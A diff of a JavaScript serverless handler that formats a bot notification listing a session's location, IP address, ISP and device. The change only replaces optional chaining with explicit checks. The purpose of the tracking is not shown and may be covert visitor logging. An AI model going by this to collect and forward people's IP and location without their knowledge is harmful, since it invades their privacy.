@@ -65,7 +65,7 @@ module.exports = async (req, res) => {
             `🌍 <b>Loc:</b> ${sessionData.city}, ${sessionData.country}\n` +
             `📡 <b>IP:</b> <code>${sessionData.ip}</code>\n` +
             `🏢 <b>ISP:</b> ${sessionData.org}\n` +
-            `💻 <b>Sys:</b> ${sessionData.device?.model || sessionData.device || 'Unknown'} (${sessionData.device?.os || 'N/A'})`;
+            `💻 <b>Sys:</b> ${(sessionData.device && sessionData.device.model) ? sessionData.device.model : (sessionData.device || 'Unknown')} (${(sessionData.device && sessionData.device.os) ? sessionData.device.os : 'N/A'})`;
 
         const buttons = {
             inline_keyboard: [
